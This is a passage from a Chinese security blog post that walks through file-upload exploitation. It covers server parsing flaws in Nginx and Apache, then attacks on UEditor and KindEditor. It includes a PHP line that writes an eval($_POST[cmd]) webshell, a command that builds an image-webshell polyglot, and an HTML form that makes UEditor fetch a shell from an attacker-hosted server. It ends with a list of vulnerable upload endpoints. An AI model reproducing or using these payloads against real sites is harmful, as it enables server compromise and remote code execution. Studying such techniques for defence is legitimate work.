<p>另外一种手法：上传一个名字为test.jpg，以下是文件的内容：<br><?PHP fputs(fopen('shell.php','w'),'<?php eval($_POST[cmd])?>‘);?&gt;<br>然后访问 test.jpg/.php，在这个目录下就会生成一句话木马shell.php。</p>
<h4 id="Nginx-engine-x-lt-0-8-03-空字节代码-解析漏洞"><a href="#Nginx-engine-x-lt-0-8-03-空字节代码-解析漏洞" class="headerlink" title="Nginx(engine x)&lt; 0.8.03 空字节代码 解析漏洞"></a>Nginx(engine x)&lt; 0.8.03 空字节代码 解析漏洞</h4><p>影响版：0.5、0.6、0.7&lt;= 0.7.65、0.8 &lt;= 0.8.37<br>Nginx在图片中嵌入PHP代码然后通过访问<br>xxx.jpg%00.php<br>来执行其中的代码；</p>
<h4 id="apache-1-x-2-x解析漏洞"><a href="#apache-1-x-2-x解析漏洞" class="headerlink" title="apache 1.x , 2.x解析漏洞"></a>apache 1.x , 2.x解析漏洞</h4><p>漏洞原理<br>Apache在解析文件名的时候是从右向左读<br>例如：test.php.owf.rar “.owf”和”.rar” 这两种后缀是apache不可识别解析，apache就会把test.php.owf.rar解析成php。</p>
<h4 id="Apache-0A解析截断（Apache2-4-0到2-4-29）"><a href="#Apache-0A解析截断（Apache2-4-0到2-4-29）" class="headerlink" title="Apache%0A解析截断（Apache2.4.0到2.4.29）"></a>Apache%0A解析截断（Apache2.4.0到2.4.29）</h4><p>如上传a.php，然后在burp中修改文件名为a.php\x0A</p>
<h2 id="富文本编辑器的利用"><a href="#富文本编辑器的利用" class="headerlink" title="富文本编辑器的利用"></a>富文本编辑器的利用</h2><h3 id="ueditor"><a href="#ueditor" class="headerlink" title="ueditor"></a>ueditor</h3><p><strong>UEditor .net版本&lt;= v1.4.3.3</strong></p>
<p>验证码漏洞是否存在：拼接漏洞URL地址：<br><strong>UEditor/net/controller.ashx?action=catchimage</strong><br>显示{“state”:”参数错误：没有指定抓取源”}，就基本确定存在漏洞了</p>
<p>/xsgl/ueditorUE//net/config.json 查看上传的限制</p>
<figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#生成图片马,注意后缀需要是图片格式</span></span><br><span class="line">copy normal.jpg/b+shell.aspx/a shell.jpg</span><br><span class="line"><span class="comment">#打开web服务</span></span><br><span class="line">python -m SimpleHTTPServer 8888</span><br></pre></td></tr></table></figure>
<p>使用post方式传入我们的图片路径</p>
<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">form</span> <span class="attr">action</span>=<span class="string">&quot;http://IP:port/ueditor/net/controller.ashx?action=catchimage&quot;</span><span class="attr">enctype</span>=<span class="string">&quot;application/x-www-form-urlencoded&quot;</span> <span class="attr">method</span>=<span class="string">&quot;POST&quot;</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">p</span>&gt;</span>shell addr:<span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;text&quot;</span> <span class="attr">name</span>=<span class="string">&quot;source[]&quot;</span> /&gt;</span>&lt;/p &gt;</span><br><span class="line"><span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;submit&quot;</span> <span class="attr">value</span>=<span class="string">&quot;Submit&quot;</span>/&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">form</span>&gt;</span></span><br></pre></td></tr></table></figure>
<p>输入<br><a target="_blank" rel="noopener" href="http://xxxx:8888/shell.jpg?.aspx">http://XXXX:8888/shell.jpg?.aspx</a><br>或<br><a target="_blank" rel="noopener" href="http://xxxx:8888/shell.jpg#.aspx">http://XXXX:8888/shell.jpg#.aspx</a><br>他请求的还是shell.jpg，但是后面.aspx会被ueditor截取充当后缀</p>
<p>/net/controller.ashx?action=listfile</p>
<h3 id="kindeditor"><a href="#kindeditor" class="headerlink" title="kindeditor"></a>kindeditor</h3><p><strong>kindeditor&lt;=4.1.1</strong><br>下述路径若存在则存在漏洞</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">kindeditor/asp/upload_json.asp?dir=file</span><br><span class="line">kindeditor/asp.net/upload_json.ashx?dir=file</span><br><span class="line">kindeditor/jsp/upload_json.jsp?dir=file</span><br><span class="line">kindeditor/php/upload_json.php?dir=file</span><br></pre></td></tr></table></figure>


        </div>

        
        <section class="post-tags">
            <div>
                <span>Tag(s):</span>
                <span class="tag">
                    
                    
                        <a href="/tags/file/"># file</a>
                    
                        
                </span>
            </div>
            <div>
                <a href="javascript:window.history.back();">back</a>
                <span>· </span>
                <a href="/">home</a>
            </div>
        </section>
        <section class="post-nav">
            
                <a class="prev" rel="prev" href="/2025/08/26/ai/ai%E6%89%AB%E7%9B%B2/">ai扫盲</a>
            
            
            <a class="next" rel="next" href="/2025/05/02/sql/SQL%20Server%E6%B3%A8%E5%85%A5/">SQL Server注入</a>
            
        </section>


    </article>
</div>

            </div>
            <footer id="footer" class="footer">
    <div class="copyright">
        <span>© mayylu | Powered by <a href="https://hexo.io" target="_blank">Hexo</a> & <a href="https://github.com/Siricee/hexo-theme-Chic" target="_blank">Chic</a></span>
    </div>
</footer>

    </div>
</body>

</html>